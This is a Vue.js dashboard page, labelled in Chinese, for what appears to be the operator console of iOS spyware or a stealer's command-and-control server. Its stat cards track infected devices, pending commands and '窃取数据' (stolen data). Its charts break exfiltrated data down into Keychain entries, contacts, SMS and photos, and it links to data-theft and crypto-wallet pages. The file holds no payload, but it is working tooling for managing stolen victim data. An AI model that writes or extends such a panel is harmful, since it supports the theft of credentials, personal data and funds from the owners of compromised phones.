<template>
  <div class="dashboard">
    <!-- 核心指标卡片 -->
    <div class="section-title">
      <span class="title-bar"></span>
      <span class="title-text">核心指标</span>
    </div>
    <el-row :gutter="16" class="stat-row">
      <el-col :xs="12" :sm="12" :md="6" :lg="6">
        <el-card class="stat-card" shadow="hover">
          <div class="stat-content">
            <div class="stat-header">
              <div class="stat-icon request">
                <el-icon size="22"><Document /></el-icon>
              </div>
              <div class="stat-trend" :class="stats.today_requests > 0 ? 'up' : 'flat'">
                <el-icon><Top /></el-icon>
                <span>{{ stats.today_requests }}</span>
              </div>
            </div>
            <div class="stat-body">
              <div class="stat-value">{{ stats.total_requests }}</div>
              <div class="stat-label">总请求数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :xs="12" :sm="12" :md="6" :lg="6">
        <el-card class="stat-card" shadow="hover">
          <div class="stat-content">
            <div class="stat-header">
              <div class="stat-icon device">
                <el-icon size="22"><Phone /></el-icon>
              </div>
              <div class="stat-trend" :class="stats.active_devices > 0 ? 'up' : 'flat'">
                <el-icon><Top /></el-icon>
                <span>{{ stats.active_devices }} 在线</span>
              </div>
            </div>
            <div class="stat-body">
              <div class="stat-value">{{ stats.total_devices }}</div>
              <div class="stat-label">设备总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :xs="12" :sm="12" :md="6" :lg="6">
        <el-card class="stat-card" shadow="hover">
          <div class="stat-content">
            <div class="stat-header">
              <div class="stat-icon exfil">
                <el-icon size="22"><FolderOpened /></el-icon>
              </div>
              <div class="stat-trend" :class="stats.today_exfil > 0 ? 'up' : 'flat'">
                <el-icon><Top /></el-icon>
                <span>{{ stats.today_exfil }}</span>
              </div>
            </div>
            <div class="stat-body">
              <div class="stat-value">{{ stats.total_exfil }}</div>
              <div class="stat-label">窃取数据</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :xs="12" :sm="12" :md="6" :lg="6">
        <el-card class="stat-card" shadow="hover">
          <div class="stat-content">
            <div class="stat-header">
              <div class="stat-icon pending">
                <el-icon size="22"><Timer /></el-icon>
              </div>
              <div class="stat-trend" :class="stats.pending_commands > 0 ? 'up' : 'flat'">
                <el-icon><Top /></el-icon>
                <span>{{ stats.pending_commands }}</span>
              </div>
            </div>
            <div class="stat-body">
              <div class="stat-value">{{ stats.pending_commands }}</div>
              <div class="stat-label">待执行命令</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <!-- 图表区域 -->
    <div class="section-title">
      <span class="title-bar"></span>
      <span class="title-text">数据趋势</span>
    </div>
    <el-row :gutter="16" class="chart-row">
      <el-col :xs="24" :md="16">
        <el-card class="chart-card" shadow="hover">
          <template #header>
            <div class="card-header">
              <span class="card-title">请求与窃取趋势</span>
              <el-radio-group v-model="trendRange" size="small" @change="initCharts">
                <el-radio-button value="7" label="近7天">近7天</el-radio-button>
                <el-radio-button value="30" label="近30天">近30天</el-radio-button>
              </el-radio-group>
            </div>
          </template>
          <div ref="trendChart" class="chart"></div>
        </el-card>
      </el-col>
      <el-col :xs="24" :md="8">
        <el-card class="chart-card" shadow="hover">
          <template #header>
            <div class="card-header">
              <span class="card-title">数据类型分布</span>
            </div>
          </template>
          <div ref="pieChart" class="chart"></div>
        </el-card>
      </el-col>
    </el-row>

    <!-- 最近活动 -->
    <div class="section-title">
      <span class="title-bar"></span>
      <span class="title-text">最近活动</span>
    </div>
    <el-row :gutter="16" class="activity-row">
      <el-col :xs="24" :md="12">
        <el-card class="activity-card" shadow="hover">
          <template #header>
            <div class="card-header">
              <span class="card-title">最近设备</span>
              <el-button text type="primary" @click="$router.push('/devices')">查看全部</el-button>
            </div>
          </template>
          <el-table :data="recentDevices" border size="small">
            <el-table-column prop="device_uuid" label="设备UUID" width="200" show-overflow-tooltip />
            <el-table-column prop="ip" label="IP地址" width="130" />
            <el-table-column label="状态" width="90">
              <template #default="scope">
                <el-tag :type="scope.row.status === 'active' ? 'success' : 'info'" size="small">
                  {{ scope.row.status === 'active' ? '活跃' : '离线' }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column label="最后访问" width="170">
              <template #default="scope">{{ formatTime(scope.row.last_seen) }}</template>
            </el-table-column>
          </el-table>
        </el-card>
      </el-col>
      <el-col :xs="24" :md="12">
        <el-card class="activity-card" shadow="hover">
          <template #header>
            <div class="card-header">
              <span class="card-title">最近日志</span>
              <el-button text type="primary" @click="$router.push('/logs')">查看全部</el-button>
            </div>
          </template>
          <el-table :data="recentLogs" border size="small">
            <el-table-column label="时间" width="160">
              <template #default="scope">{{ formatTime(scope.row.timestamp) }}</template>
            </el-table-column>
            <el-table-column prop="ip" label="IP地址" width="130" />
            <el-table-column label="类型" width="90">
              <template #default="scope">
                <el-tag :type="getLogTypeTag(scope.row.log_type)" size="small">
                  {{ getLogTypeText(scope.row.log_type) }}
                </el-tag>
              </template>
            </el-table-column>
            <el-table-column prop="path" label="路径" show-overflow-tooltip />
          </el-table>
        </el-card>
      </el-col>
    </el-row>

    <!-- 快捷操作 -->
    <div class="section-title">
      <span class="title-bar"></span>
      <span class="title-text">快捷操作</span>
    </div>
    <el-row :gutter="16" class="quick-actions">
      <el-col :xs="12" :sm="6" :md="6">
        <el-card class="action-card" shadow="hover" @click="$router.push('/devices')">
          <el-icon size="28" color="#409eff"><Phone /></el-icon>
          <span>设备管理</span>
        </el-card>
      </el-col>
      <el-col :xs="12" :sm="6" :md="6">
        <el-card class="action-card" shadow="hover" @click="$router.push('/exfil')">
          <el-icon size="28" color="#f56c6c"><FolderOpened /></el-icon>
          <span>数据窃取</span>
        </el-card>
      </el-col>
      <el-col :xs="12" :sm="6" :md="6">
        <el-card class="action-card" shadow="hover" @click="$router.push('/wallets')">
          <el-icon size="28" color="#e6a23c"><Wallet /></el-icon>
          <span>数字钱包</span>
        </el-card>
      </el-col>
      <el-col :xs="12" :sm="6" :md="6">
        <el-card class="action-card" shadow="hover" @click="$router.push('/logs')">
          <el-icon size="28" color="#67c23a"><Document /></el-icon>
          <span>访问日志</span>
        </el-card>
      </el-col>
    </el-row>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, onUnmounted, nextTick } from "vue"
import { Document, Phone, FolderOpened, Timer, Top, Wallet } from "@element-plus/icons-vue"
import axios from "../utils/axios"
import * as echarts from "echarts"

const stats = reactive({
  total_requests: 0, total_devices: 0, total_exfil: 0, today_requests: 0, today_exfil: 0,
  request_trend: [], exfil_trend: [], active_devices: 0, pending_commands: 0, ios_logs: 0
})

const recentLogs = ref([])
const recentDevices = ref([])
const trendChart = ref(null)
const pieChart = ref(null)
const trendRange = ref("7")
let chartInstances = []

function formatTime(time) {
  if (!time) return "-"
  return time.replace("T", " ").substring(0, 19)
}

function getLogTypeTag(type) {
  const tags = { ios: "danger", exfil: "danger", request: "info", frontend: "warning", api: "success" }
  return tags[type] || "info"
}

function getLogTypeText(type) {
  const texts = { ios: "iOS设备", exfil: "数据窃取", request: "请求", frontend: "前端", api: "API" }
  return texts[type] || type
}

async function loadStats() {
  try {
    const response = await axios.get("/api/logs/stats")
    Object.assign(stats, response.data)
  } catch (error) { console.error("加载统计数据失败:", error) }
}

async function loadRecentLogs() {
  try {
    const response = await axios.get("/api/logs?limit=8")
    recentLogs.value = response.data
  } catch (error) { console.error("加载日志失败:", error) }
}

async function loadRecentDevices() {
  try {
    const response = await axios.get("/api/devices?limit=8")
    recentDevices.value = response.data
  } catch (error) { console.error("加载设备失败:", error) }
}

function initCharts() {
  chartInstances.forEach(c => c && c.dispose())
  chartInstances = []

  const days = parseInt(trendRange.value)
  const labels = []
  for (let i = days - 1; i >= 0; i--) {
    const date = new Date()
    date.setDate(date.getDate() - i)
    labels.push(`${date.getMonth() + 1}/${date.getDate()}`)
  }

  const reqData = stats.request_trend || []
  const exfilData = stats.exfil_trend || []

  if (trendChart.value) {
    const chart = echarts.init(trendChart.value)
    chart.setOption({
      tooltip: { trigger: "axis" },
      legend: { data: ["请求数", "窃取数据"], bottom: 0 },
      grid: { left: "3%", right: "4%", bottom: "10%", containLabel: true },
      xAxis: { type: "category", data: labels, boundaryGap: false },
      yAxis: [
        { type: "value", name: "请求数" },
        { type: "value", name: "窃取量" }
      ],
      series: [
        {
          name: "请求数", type: "line", data: reqData, smooth: true,
          itemStyle: { color: "#409eff" },
          areaStyle: { color: "rgba(64, 158, 255, 0.1)" }
        },
        {
          name: "窃取数据", type: "line", yAxisIndex: 1, data: exfilData, smooth: true,
          itemStyle: { color: "#f56c6c" },
          areaStyle: { color: "rgba(245, 108, 108, 0.1)" }
        }
      ]
    })
    chartInstances.push(chart)
  }

  if (pieChart.value) {
    const chart = echarts.init(pieChart.value)
    const pieData = [
      { name: "Keychain", value: stats.ios_logs || 0 },
      { name: "通讯录", value: stats.today_exfil || 0 },
      { name: "短信", value: 0 },
      { name: "照片", value: 0 },
      { name: "其他", value: stats.total_exfil || 0 }
    ].filter(d => d.value > 0)

    chart.setOption({
      tooltip: { trigger: "item", formatter: "{a} <br/>{b}: {c} ({d}%)" },
      legend: { bottom: 0, left: "center" },
      series: [{
        name: "数据分布", type: "pie", radius: ["40%", "70%"],
        avoidLabelOverlap: false,
        label: { show: false, position: "center" },
        emphasis: { label: { show: true, fontSize: "18", fontWeight: "bold" } },
        labelLine: { show: false },
        data: pieData.length > 0 ? pieData : [{ name: "暂无数据", value: 1 }]
      }]
    })
    chartInstances.push(chart)
  }
}

onMounted(async () => {
  await loadStats()
  await loadRecentLogs()
  await loadRecentDevices()
  nextTick(() => { initCharts() })
})

onUnmounted(() => {
  chartInstances.forEach(c => c && c.dispose())
})
</script>

<style scoped>
.dashboard { padding: 0; }

/* 区块标题 */
.section-title {
  display: flex;
  align-items: center;
  margin: 20px 0 12px;
}
.title-bar {
  width: 4px;
  height: 16px;
  background: #409eff;
  border-radius: 2px;
  margin-right: 8px;
}
.title-text {
  font-size: 15px;
  font-weight: 600;
  color: #303133;
}

/* 统计卡片 */
.stat-row { margin-bottom: 4px; }
.stat-card { margin-bottom: 12px; transition: transform 0.3s; }
.stat-card:hover { transform: translateY(-2px); }
.stat-card :deep(.el-card__body) { padding: 16px; }
.stat-content { display: flex; flex-direction: column; gap: 12px; }
.stat-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.stat-icon {
  width: 40px;
  height: 40px;
  border-radius: 8px;
  display: flex;
  justify-content: center;
  align-items: center;
}
.stat-icon.request { background: #e6f7ff; color: #409eff; }
.stat-icon.device { background: #f6ffed; color: #67c23a; }
.stat-icon.exfil { background: #fff7e6; color: #e6a23c; }
.stat-icon.pending { background: #fff5f5; color: #f56c6c; }
.stat-trend {
  display: flex;
  align-items: center;
  gap: 4px;
  font-size: 12px;
  color: #909399;
}
.stat-trend.up { color: #f56c6c; }
.stat-trend.flat { color: #909399; }
.stat-body { text-align: left; }
.stat-value {
  font-size: 24px;
  font-weight: 700;
  color: #303133;
  line-height: 1.2;
}
.stat-label {
  font-size: 13px;
  color: #909399;
  margin-top: 4px;
}

/* 图表区域 */
.chart-row { margin-bottom: 4px; }
.chart-card { margin-bottom: 12px; }
.chart-card :deep(.el-card__body) { padding: 16px; }
.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.card-title { font-size: 14px; font-weight: 600; color: #303133; }
.chart { height: 280px; }

/* 活动区域 */
.activity-row { margin-bottom: 4px; }
.activity-card { margin-bottom: 12px; }

/* 快捷操作 */
.quick-actions { margin-bottom: 12px; }
.action-card {
  cursor: pointer;
  transition: all 0.3s;
  text-align: center;
}
.action-card :deep(.el-card__body) {
  padding: 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
}
.action-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
}
.action-card span {
  font-size: 14px;
  color: #606266;
  font-weight: 500;
}
</style>
